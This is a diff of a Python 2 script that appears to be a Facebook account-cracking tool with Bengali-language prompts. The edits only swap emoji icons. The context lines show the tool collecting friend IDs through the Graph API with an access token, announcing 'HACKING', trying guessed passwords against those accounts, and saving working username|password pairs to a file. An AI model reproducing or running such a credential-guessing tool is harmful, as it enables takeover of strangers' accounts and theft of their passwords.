@@ -101,9 +101,9 @@ CorrectPassword = "CAF"
 
 loop = 'true'
 while (loop == 'true'):
-    username = raw_input("\033[1;97m📋 \x1b[1;95mENTER USER\x1b[1;97m»» \x1b[1;97m")
+    username = raw_input("\033[1;97m📝 \x1b[1;95mENTER USER\x1b[1;97m»» \x1b[1;97m")
     if (username == CorrectUsername):
-    	password = raw_input("\033[1;97m🗝 \x1b[1;95mENTER PASSWORD\x1b[1;97m»» \x1b[1;97m")
+    	password = raw_input("\033[1;97m🔑 \x1b[1;95mENTER PASSWORD\x1b[1;97m»» \x1b[1;97m")
         if (password == CorrectPassword):
             print "Logged in successfully as " + username #Dev:ROBERT
 	    time.sleep(2)
@@ -261,7 +261,7 @@ def pilih_super():
 		os.system('clear')
 		print logo
 
-		jalan('\033[1;93m[✺] Getting IDs \033[1;97m...')
+		jalan('\033[1;93m[😌] Getting IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
@@ -279,7 +279,7 @@ def pilih_super():
 			print"\x1b[1;92m[😌] ID pawa jay nai!"
 			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
 			super()
-		print"\033[1;35;40m[✺] IDs newa hocche..."
+		print"\033[1;35;40m[😌] IDs newa hocche..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -306,10 +306,10 @@ def pilih_super():
 		pilih_super()
 	
 	print "\033[1;96m[+] \033[1;93mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
-	jalan('\033[1;96m[✺] \033[1;93mSuru hocche \033[1;97m...')
+	jalan('\033[1;96m[😌] \033[1;93mSuru hocche \033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mHACKING \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m[\033[1;97m👻\033[1;96m] \033[1;93mHACKING \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
 	print('\x1b[1;96m[!] \x1b[1;93mProcess Off korte CTRL  tarpor  press    Z ')
 	print 42*"\033[1;96m="
@@ -403,7 +403,7 @@ def pilih_super():
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;36;40m[IN LOC] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' ⚡ ' + b['name']
+															print '\x1b[1;36;40m[IN LOC] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass6 + ' 🇧🇩 ' + b['name']
 															cek = open("out/CP.txt", "a")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
